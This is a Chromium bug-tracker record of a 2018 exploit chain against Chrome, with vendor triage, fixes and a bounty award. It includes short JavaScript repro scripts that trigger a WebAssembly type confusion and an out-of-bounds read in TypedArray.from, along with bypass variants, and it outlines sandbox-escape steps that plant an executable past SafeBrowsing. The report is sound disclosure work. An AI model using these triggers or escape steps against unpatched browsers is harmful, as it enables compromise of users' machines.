# Chrome exploit: WebAssembly type confusion + V8 OOB read + sandbox escape

| Field | Value |
|-------|-------|
| **Issue ID** | [40091185](https://issues.chromium.org/issues/40091185) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Blink>JavaScript, Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | cr...@chromium.org |
| **Created** | 2018-04-23 |
| **Bounty** | Confirmed (amount unknown) |

## Description

**VULNERABILITY DETAILS**  

This is an attempt to re-build the exploit chain from <https://crbug.com/820838> after all the hardening patches have  

been landed.

## Type confusion in WebAssembly.Instantiate

## <https://cs.chromium.org/chromium/src/v8/src/wasm/wasm-js.cc?rcl=8ba3ef5fcd21c5e717a1b7bd0713612a287b9500&l=324> MaybeLocal<Value> WebAssemblyInstantiateImpl(Isolate\* isolate, Local<Value> module, Local<Value> ffi) { [...] i::Handle<i::WasmModuleObject> module\_obj = i::Handle<i::WasmModuleObject>::cast( Utils::OpenHandle(Object::Cast(\*module))); // \*\*\*\*\*\*\*\*\* instance\_object = i\_isolate->wasm\_engine()->SyncInstantiate( i\_isolate, &thrower, module\_obj, maybe\_imports, i::MaybeHandle<i::JSArrayBuffer>()); } [...] void WebAssemblyInstantiate(const v8::FunctionCallbackInfo[v8::Value](javascript:void(0);)& args) { [...] if (first\_arg->IsWasmModuleObject()) { module\_promise = resolver->GetPromise(); if (!resolver->Resolve(context, first\_arg\_value).IsJust()) return; instantiator = WebAssemblyInstantiateImplCallback; } else { [...] ASSIGN(Function, instantiate\_impl, Function::New(context, instantiator, data)); ASSIGN(Promise, result, module\_promise->Then(context, instantiate\_impl)); args.GetReturnValue().Set(result);

|WebAssemblyInstantiate()| performs a type check on the first argument and passes it to the corresponding function  

using a JS promise. The problem is that if the argument has a method named "then", |JSPromise::Resolve()| calls it and  

uses the result instead. Therefore, it's possible to pass any value to |WebAssemblyInstantiateImpl()|, which casts it  

to the WasmModuleObject type.

**REPRODUCTION CASE**

<script>
module = new WebAssembly.Module(new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]));
module.then = resolve => resolve(String.fromCharCode.apply(null, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]));
WebAssembly.instantiate(module, {});
</script>

The exploitation of this vulnerability requires crafting a ridiculously large set of fake objects and a separate info  

leak bug.

## OOB read in TypedArray.from

<https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-typed-array-gen.cc?rcl=8ba3ef5fcd21c5e717a1b7bd0713612a287b9500&l=1705>  

ES6 #sec-%typedarray%.from  

TF\_BUILTIN(TypedArrayFrom, TypedArrayBuiltinsAssembler) {  

[...]  

TNode<JSArray> values = CAST(  

CallBuiltin(Builtins::kIterableToList, context, source, iterator\_fn));

```
// This is not a spec'd limit, so it doesn't particularly matter when we  
// throw the range error for typed array length > MaxSmi.  
TNode<Object> raw_length = LoadJSArrayLength(values);  
GotoIfNot(TaggedIsSmi(raw_length), &if_length_not_smi);  

final_length = CAST(raw_length);  
final_source = values;  
Goto(&create_typed_array);  

BIND(&if_length_not_smi);  
ThrowRangeError(context, MessageTemplate::kInvalidTypedArrayLength,  
                raw_length);  

```

}  

[...]  

BIND(&create\_typed\_array);  

{  

// 7c/11. Let targetObj be ? TypedArrayCreate(C, «len»).  

target\_obj = CreateByLength(context, receiver, final\_length.value(),  

"%TypedArray%.from");

```
Branch(mapping.value(), &slow_path, &fast_path);  

```

}

BIND(&fast\_path);  

{  

Label done(this);  

GotoIf(SmiEqual(final\_length.value(), SmiConstant(0)), &done);

```
CallRuntime(Runtime::kTypedArrayCopyElements, context, target_obj.value(),  
            final_source.value(), final_length.value());  
Goto(&done);  

BIND(&done);  
args.PopAndReturn(target_obj.value());  

```

}

<https://cs.chromium.org/chromium/src/v8/src/elements.cc?rcl=8ba3ef5fcd21c5e717a1b7bd0713612a287b9500&l=3362>  

static bool TryCopyElementsFastNumber(Context\* context, JSArray\* source,  

JSTypedArray\* destination,  

size\_t length, uint32\_t offset) {  

if (Kind == BIGINT64\_ELEMENTS || Kind == BIGUINT64\_ELEMENTS) return false;  

Isolate\* isolate = source->GetIsolate();  

DisallowHeapAllocation no\_gc;  

DisallowJavascriptExecution no\_js(isolate);

```
ElementsKind kind = source->GetElementsKind();  
BackingStore\* dest = BackingStore::cast(destination->elements());  

```

[...]  

if (kind == PACKED\_SMI\_ELEMENTS) {  

FixedArray\* source\_store = FixedArray::cast(source->elements());

```
  for (uint32_t i = 0; i < length; i++) {  
    Object\* elem = source_store->get(i);  
    DCHECK(elem->IsSmi());  
    int int_value = Smi::ToInt(elem);  
    dest->set(offset + i, dest->from(int_value));  
  }  
  return true;  

```
## [...]

|TypedArrayFrom()| obtains the length of the |source| argument and then calls a user-defined function inside  

|CreateByLength()|, which could shrink |source|. If |source| is a fast array, this may cause an OOB read later  

in |TryCopyElementsFastNumber()| because it doesn't ensure |length| is still valid.

**REPRODUCTION CASE**

<script>
oobArray = [];
for (let i = 0; i < 1024 \\* 1024; ++i) {
oobArray[i] = 1.1;
}
floatArray = new Float64Array(oobArray.length);
Float64Array.from.call(function(length) {
oobArray.length = 0;
return floatArray;
}, oobArray);
</script>

Sandbox escape

1. The PDF plugin is no longer able to run JavaScript in the PDF viewer extension using |ExecuteScript()|, however,  
   
   it's still possible to create a filesystem: entry with the origin of the PDF extension via the File IO PPAPI.
2. The fix[1] stopped the "noopener" trick from working for filesystem:chrome-extension: URLs, but there is another way  
   
   to bypass the web\_accessible\_resource restriction. The URL check in ExtensionNavigationThrottle[2] relies on the output  
   
   of |GetLastCommittedURL()|. A compromised renderer can commit any chrome-extension: URL through |RenderFrameHostImpl::  
   
   DidCommitSameDocumentNavigation()|. There is also an explicit check for filesystem:chrome-extension: URLs, but it  
   
   doesn't apply to child frames.
3. Although the patch[3] restricted the PDF viewer extension's permissions, it still can execute JavaScript in  
   
   chrome://resource/. It turns out that a chrome: page can create a filesystem: URL with the origin of another chrome:  
   
   page and use it to run JavaScript inside that page's process.
4. A native download confirmation dialog has been added back in [4], which broke the DLL preloading part from <https://crbug.com/chromium/820838>.  
   
   |WebDatabaseHostImpl::OpenFile()| allows a renderer process to access files inside the "User Data\Default\databases"  
   
   directory. The exploit changes the default download path preference to that directory and loads an executable file.  
   
   SafeBrowsing considers it good and therefore skips the dangerous download prompt. Then the exploit deletes the file to  
   
   get rid of the Zone.Identifier NTFS stream, creates a new file with the same name and saves the payload.

1 - <https://chromium.googlesource.com/chromium/src/+/1cb9c33c4afd6df591c6306511bac80ec216d463>  

2 - <https://cs.chromium.org/chromium/src/extensions/browser/extension_navigation_throttle.cc?rcl=7e651fba081b5a1507f36a844cb33c09ed66d2f5&l=35>  

3 - <https://chromium.googlesource.com/chromium/src/+/d8206c55039dc71555ea92bde3080c8743ad11b8>  

4 - <https://chromium.googlesource.com/chromium/src/+/3961faa28b6c71be4ae6fd435e1663b13ac5c30c>

**VERSION**  

Google Chrome 65.0.3325.181 (Official Build) (64-bit) (cohort: Stable) [except for the TypedArray.from bug]  

Google Chrome 66.0.3359.117 (Official Build) beta (64-bit) (cohort: Beta)  

Google Chrome 67.0.3396.10 (Official Build) dev (64-bit) (cohort: Dev)  

Google Chrome 68.0.3404.0 (Official Build) canary (64-bit) (cohort: Clang-64)  

Microsoft Windows [Version 10.0.16299.309]

## Attachments

- [exploit.zip](attachments/exploit.zip) (application/octet-stream, 280.4 KB)
- [asan-wasm.log](attachments/asan-wasm.log) (text/plain, 4.3 KB)
- [asan-v8.log](attachments/asan-v8.log) (text/plain, 6.5 KB)

## Timeline

### va...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript Blink>JavaScript>WebAssembly]

### va...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### va...@chromium.org (2018-04-23)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-04-23)

Thanks for the report, and for spotting places that the defenses from https://crbug.com/chromium/820838 didn't cover!

We'll go through the new privilege escalation steps.

### dc...@chromium.org (2018-04-23)

https://crbug.com/chromium/823864 should be fixed soon (which will block user gesture spoofing to open a file via chrome://downloads), so that might be something to consider for merging along with the other fixes.

### cr...@chromium.org (2018-04-24)

Quick updates so far.

1) PDF plugin is still allowed to create filesystem: entries.
raymes@ mentioned that this wasn't a concern in our discussions of the last bug.  I'd like to understand more about what cases require it, so that we don't leave it in place unnecessarily.

2) Compromised renderers can commit extension origins and URLs.
This is bad.  The exploit is committing about:blank with an extension origin in a non-extension process, and then it's doing a replaceState to an extension URL.  We have places that could catch both of these commits in RenderFrameHostImpl::CanCommitURL and CanCommitOrigin, but they're not enforcing anything about extension URLs vs processes.  I put together a quick test and CL to wire them up to ChildProcessSecurityPolicyImpl::CanCommitURL, and that blocks the exploit but causes several tests to fail.  I'll look into that to see what the right policy is.

3) chrome:// pages are allowed to create filesystem URLs in other chrome:// origins.
This is also bad.  PDFium's extension process has host access to chrome://resources, and the exploit is able to script a HTML page in that origin to generate filesystem URLs in other chrome:// origins.  We should ensure that chrome:// processes can't create filesystem URLs (or blobs) for other chrome:// origins than their own.  Or create filesystem/blob URLs at all, if we can get away with not supporting those features in chrome:// origins, since they're so risky.  We should also discuss whether chrome://resources can be moved to a non-chrome:// scheme, given that it has a fair amount of power and PDFium (and probably other things) can still script it.

4) SafeBrowsing download check seems to be bypassed by deleting and recreating file.
jialiu@ or asanka@, can you help look into this bypass and see what needs to be fixed?

5) WebAssembly bug.
bradnelson@, can you find an owner or post an update on the WebAssembly type confusion exploit?

### va...@chromium.org (2018-04-24)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-04-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-04-24)

Split off the wasm bug.

### sh...@chromium.org (2018-04-24)

This is a critical security issue. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### as...@chromium.org (2018-04-24)

Filed https://crbug.com/chromium/836362 regarding download placement via changing the downloads directory.

Also, it seems unnecessary for WebDatabaseHost to base the database's on-disk filename on a renderer provided string.


### go...@chromium.org (2018-04-24)

We're planning to promote current M67 Dev build #67.0.3396.18 to M67 Beta on Thursday, 04/26. Will this be a M67 Beta blocker for first promotion?

### go...@chromium.org (2018-04-24)

Is this only applicable to Windows? If not, pls add all applicable OSs.

### mt...@chromium.org (2018-04-24)

[Empty comment from Monorail migration]

### br...@chromium.org (2018-04-25)

Thanks for picking up ahaas@ & clemensh@ & mstarzinger@, sorry was OOO.

Marked affected OSes.
Assuming ahaas / mstarzinger / clemensh don't cherrypick it overnight, will try to pick tomorrow.


### aw...@google.com (2018-04-25)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-04-25)

The WASM bug has been fixed-- thanks ahaas@!  I'll take ownership while we address the privilege escalation aspects.  Status update:

1) PDF plugin is still allowed to create filesystem: entries.
raymes@: I know we thought this was safe before, but it does seem a bit odd that the untrusted content inside the PDF process can create things in the origin of the (more privileged) extension process.  Can you help me understand the cases it's needed for?

2) Compromised renderers can commit extension origins and URLs, and use that for loading extension filesystem URLs.
This is being tracked in https://crbug.com/chromium/836858.  I have a CL in review for the filesystem URL part by applying the process check to all frames rather than just main frames, since that seems to not break anything.  In parallel, I'm trying to update CanCommitURL to catch the extension origin/URL cases, though there are a lot of exceptions we need to account for.

3) chrome:// pages are allowed to create filesystem URLs in other chrome:// origins.
This is being tracked in https://crbug.com/chromium/836859.  The current plan is to either prevent filesystem and blob URLs in chrome: entirely (to reduce attack surface) or enforce in the browser process that one chrome:// origin can't create them for other chrome:// origins.

4) SafeBrowsing download check seems to be bypassed by deleting and recreating file.
This is being tracked in https://crbug.com/chromium/836362.  Some discussion about whether we can restrict the download directory to be set to values chosen by native file dialogs only.

5) WebAssembly bug.
This has been fixed in https://crbug.com/chromium/836141 and merged to M66 and M67.


### br...@chromium.org (2018-04-25)

Thanks ahaas!

### se...@gmail.com (2018-04-26)

ahaas@ I took a look at your patch and noticed a similar type confusion bug in WebAssembly.instantiateStreaming:

<script>
WebAssembly.Module.prototype.then = resolve => resolve(String.fromCharCode(null, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41));
WebAssembly.instantiateStreaming(fetch("data:application/wasm,%00%61%73%6d%01%00%00%00"), {});
</script>


### sh...@chromium.org (2018-04-26)

This is a critical security issue. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2018-04-26)

[Comment Deleted]

### aw...@google.com (2018-04-26)

I'm OK promoting the first 67 beta with this unaddressed there.

### go...@chromium.org (2018-04-26)

Thank you  awhalley@. We won't block first M67 beta promotion today per https://crbug.com/chromium/835887#c24.

Pls have fix ready to be merged by 4:00 PM PT so we can take it in for next week beta. 

### cr...@chromium.org (2018-04-26)

https://crbug.com/chromium/835887#c21: Thanks for spotting that issue!  ahaas@, can you take a look?

Comments 22-25: Which of the fixes are you referring to?  The WASM fix looks like it was already merged to M67 and M66 in https://crbug.com/chromium/836141.  Is that correct?

We should also try to get a fix merged for at least one of the privilege escalation issues (especially given https://crbug.com/chromium/835887#c21).  I landed r553867 yesterday for the subframe extension filesystem URL problem, and I'm planning to request merge once it's verified on Canary.

### cl...@chromium.org (2018-04-26)

Yes, wasm fix was merged back, and yes, it's incomplete.

New clusterfuzz issue (for the remaining case): https://clusterfuzz.com/v2/testcase-detail/5305166916747264

It should automatically open a new bug once the analysis is complete.

### dc...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### go...@chromium.org (2018-04-26)

Pls have fix ready to be merged by 4:00 PM PT, Monday (04/30) so we can take it in for next week beta as this is reported as Beta Blocker. Thank you.

### ah...@chromium.org (2018-04-27)

[Empty comment from Monorail migration]

### ab...@chromium.org (2018-04-27)

Awhalley@ / Creis@ - are there any merges needed for M66 here? We are planning to ramp-up.

### cr...@chromium.org (2018-04-27)

abdulsyed@: Yes, r553867 will need a merge to both M66 and M67.  It's in today's 68.0.3410.0, so I was planning to request merge on Monday (and hopefully try to verify).

It looks like ahaas@'s https://chromium-review.googlesource.com/1032392 just landed for https://crbug.com/chromium/837417 (to address https://crbug.com/chromium/835887#c21), so that will likely need a merge to M66 and M67 as well.

ahwalley@ can double check me on the urgency of each of these.  The WASM fixes are renderer exploits and r553867 disrupts the privilege escalation.

What's the timeframe for M66 merges wrt the ramp-up?

### ah...@chromium.org (2018-04-30)

I merged https://chromium-review.googlesource.com/1032392 both to M66 and M67 now.

### go...@chromium.org (2018-04-30)

Cl listed at #33 got merged to M66 & M67 without merge request and approval.

awhalley@, are you comfortable with this merge?

+ abdulsyed@ & cmasso@ (M66 Release TPMs) as FYI.

### cl...@chromium.org (2018-04-30)

#33 got merge approval in https://crbug.com/837417.

### aw...@google.com (2018-04-30)

This was approved by danno@ on https://crbug.com/chromium/837417. 

This is umbrella bug, I expect most of the changes will be done/tracked/merged in the Blocked On issues.

### go...@chromium.org (2018-04-30)

Got it, thank you.

### aw...@google.com (2018-04-30)

[Empty comment from Monorail migration]

### ab...@chromium.org (2018-05-02)

Removing M66 label for now, as we're already at 100%.

### go...@chromium.org (2018-05-02)

*** Bulk Edit ***
M67 Stable promotion is coming soon. Your bug is labelled as Stable ReleaseBlock, pls make sure to land the fix and request a merge into the release branch ASAP. 

If fix is already merged to M67 and nothing else is pending, pls mark the bug as fixed. Thank you.

### go...@chromium.org (2018-05-07)

*** Bulk Edit ***
M67 Stable promotion is coming VERY soon. Your bug is labelled as Stable ReleaseBlock, pls make sure to land the fix and request a merge into the release branch ASAP. 

If fix is already merged to M67 and nothing else is pending, pls mark the bug as fixed. Thank you.

### cr...@chromium.org (2018-05-08)

[Empty comment from Monorail migration]

### aw...@google.com (2018-05-08)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-05-08)

Status update:

1) PDF plugin is still allowed to create filesystem: entries.
I'll follow up with raymes@ offline.

2) Compromised renderers can commit extension origins and URLs, and use that for loading extension filesystem URLs.
This has been fixed in https://crbug.com/chromium/836858 and merged to both M67 and M66.  I split out https://crbug.com/chromium/840857 to track additional tightening of CanCommitURL to catch illegal commits of extension URLs.

3) chrome:// pages are allowed to create filesystem URLs in other chrome:// origins.
dcheng@ is looking into how to lock this part down in https://crbug.com/chromium/836859.

4) SafeBrowsing download check seems to be bypassed by deleting and recreating file.
stevenjb@ says he has a CL coming to fix this in https://crbug.com/chromium/836362.

5) WebAssembly bug.
The followup fix for the problem mentioned in comment # has landed in https://crbug.com/chromium/837417 and has been merged to both M67 and M66.


awhalley@: Should we keep this bug open for the additional planned enforcements for (2), (3), and (4)?  (Not sure what Status: "v" meant in https://crbug.com/chromium/835887#c43.)  :)  I think the escape has been disrupted on the M66 branch via the two WASM fixes and the privilege escalation fix in https://crbug.com/chromium/836858.  We could mark it fixed, but I'd like to make sure we get more of the enforcements in place given that this was already finding ways around a previous escape in https://crbug.com/chromium/820838.

### aw...@google.com (2018-05-08)

Thanks for the update creis@.

I'd prefer to keep this open until we've finished with the immediate responses; we can close it if there are only general hardening fixes remaining.

### aw...@chromium.org (2018-05-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-24)

We commit ourselves to a 30 day deadline for fixing for critical severity vulnerabilities, and have exceeded it here. If you're unable to look into this soon, could you please find another owner or remove yourself so that this gets back into the security triage queue?

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### pa...@chromium.org (2018-06-05)

It's been almost a month; are any further updates needed on this? Looks like https://crbug.com/chromium/836859 and https://crbug.com/chromium/840857 are still open; is that why we're holding this one open?

### cr...@chromium.org (2018-06-06)

Yes, we've been swamped with the Site Isolation launch.  This attack is already disrupted in multiple ways (the WASM fixes in https://crbug.com/chromium/837417 and https://crbug.com/chromium/836141, the privilege escalation using extension filesystem in https://crbug.com/chromium/836858, and the download directory in https://crbug.com/chromium/836362 as of r558802, merged to M67).

I was on the fence about leaving this open for the remaining hardening issues-- restricting which URLs can commit in https://crbug.com/chromium/840857 and privilege escalation from PDFium to chrome://resources in https://crbug.com/chromium/836859.  I think those are still important but less urgent than the critical label here.  We'll try to revisit them and make a call this week.

### cr...@chromium.org (2018-06-15)

For restricting commits of extension URLs, r567799 just landed in https://crbug.com/chromium/840857.  We'll keep an eye to see if that causes any unexpected renderer kills.

For WebUI escalation via chrome://resources, dcheng@ has a fix in review for https://crbug.com/chromium/836859.  I think we can close this out when that lands.

### se...@gmail.com (2018-06-18)

It seems like the TypedArray.from bug from the original report hasn't been split off.
The repro case still causes a crash in the latest Canary build.

<script>
oobArray = [];
for (let i = 0; i < 1024 * 1024; ++i) {
  oobArray[i] = 1.1;
}
floatArray = new Float64Array(oobArray.length);
Float64Array.from.call(function(length) {
  oobArray.length = 0;
  return floatArray;
}, oobArray);
</script>

Could someone with access to the blocking bugs please check?

### cr...@chromium.org (2018-06-18)

Thanks for checking!  ahaas@, I thought you were handling that in https://crbug.com/chromium/837417 and https://crbug.com/chromium/836141.  Is that not the case?  Do we need a separate V8 fix?

### cr...@chromium.org (2018-06-18)

+dschuff@ for comments 51-52, per palmer@'s advice.

### ds...@chromium.org (2018-06-19)

The repro from #51 reproduces for me in tip-of-tree d8:

#
# Fatal error in ../../src/objects/fixed-array-inl.h, line 159
# Debug check failed: map() != GetHeap()->fixed_cow_array_map() && map() != GetHeap()->fixed_array_map().
#
#
#
#FailureMessage Object: 0x7ffd62b52720
==== C stack trace ===============================

    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f736091462e]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8_libplatform.so(+0x26dd7) [0x7f73608b6dd7]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f73608fc958]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8_libbase.so(+0x2837c) [0x7f73608fc37c]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7f73608fca42]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8.so(v8::internal::FixedDoubleArray::get_scalar(int)+0xa8) [0x7f735f13f5c8]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8.so(+0x14ace78) [0x7f735f7a4e78]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8.so(+0x153254d) [0x7f735f82a54d]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8.so(+0x152e860) [0x7f735f826860]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8.so(+0x1b663a4) [0x7f735fe5e3a4]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8.so(v8::internal::Runtime_TypedArrayCopyElements(int, v8::internal::Object**, v8::internal::Isolate*)+0x107) [0x7f735fe5de87]
    /usr/local/google/home/dschuff/s/wasm-waterfall/src/work/v8/v8/out.gn/x64.debug/./libv8.so(+0x2227115) [0x7f736051f115]
Received signal 4 ILL_ILLOPN 7f7360910921
Illegal instruction



### cr...@chromium.org (2018-06-19)

Thanks.  I've filed https://crbug.com/chromium/854066 for the OOB read in TypedArray.from, and I asked hablich@ and V8 folks to take a look.

### ha...@chromium.org (2018-06-19)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-06-19)

Quick update: the TypedArray.from bug in https://crbug.com/chromium/854066 has been fixed in https://chromium-review.googlesource.com/1105774.  That will probably show up in tomorrow's Canary (likely 69.0.3466.0).  Thanks for pinging us on it (and thanks to petermarshall@ for the quick fix)!

I'll also note that dcheng@ is making progress on the chrome://resources aspect in https://crbug.com/chromium/836859.

### se...@gmail.com (2018-06-20)

Unfortunately, the fix for https://crbug.com/chromium/854066 is incomplete. It's possible to skip a call to |IterableToList| if the @@iterator
property of the source array is null or undefined.

Updated repro:
<script>
oobArray = [];
delete oobArray.__proto__[Symbol.iterator];
for (let i = 0; i < 1024 * 1024; ++i) {
  oobArray[i] = 1.1;
}
floatArray = new Float64Array(oobArray.length);
Float64Array.from.call(function(length) {
  oobArray.length = 0;
  return floatArray;
}, oobArray);
</script>

### cr...@chromium.org (2018-06-20)

https://crbug.com/chromium/835887#c58: Thanks for spotting that!  I've re-opened https://crbug.com/chromium/854066 to get an updated fix for it.

### cr...@chromium.org (2018-06-22)

petermarshall@ landed an updated fix for https://crbug.com/chromium/835887#c58 in https://chromium-review.googlesource.com/c/v8/v8/+/1108203.

### cr...@chromium.org (2018-07-09)

Good news: the chrome://resources issue was fixed in https://crbug.com/chromium/836859 (in r573079, 69.0.3484.0), so I think we can finally close this out.

### sh...@chromium.org (2018-07-10)

[Empty comment from Monorail migration]

### cr...@chromium.org (2018-07-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-07-16)

[Empty comment from Monorail migration]

### aw...@google.com (2018-07-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-07-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-07-30)

Congratulations! The VRP panel decided to award $37,500 plus a $3133.70 bonus for this chain :-D

### aw...@chromium.org (2018-07-30)

[Empty comment from Monorail migration]

### se...@gmail.com (2018-07-31)

Wow, that's quite a bounty :) Thank you, folks!

### sh...@chromium.org (2018-08-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-08-03)

This bug requires manual review: M69 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), kariahda@(iOS), cindyb@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-08-03)

Is there any merge needed here to M69? If not, pls remove "Merge-Request-69" label. Thank you.

### go...@chromium.org (2018-08-03)

[Comment Deleted]

### aw...@chromium.org (2018-08-03)

Tracking bug, merges performed on blocking bugs.

### aw...@chromium.org (2018-08-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-16)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-10-16)

This issue was migrated from crbug.com/chromium/835887?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>JavaScript, Blink>JavaScript>WebAssembly]
[Monorail blocked-on: crbug.com/chromium/836141, crbug.com/chromium/836362, crbug.com/chromium/836858, crbug.com/chromium/836859, crbug.com/chromium/837417, crbug.com/chromium/840857, crbug.com/chromium/854066]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091185)*
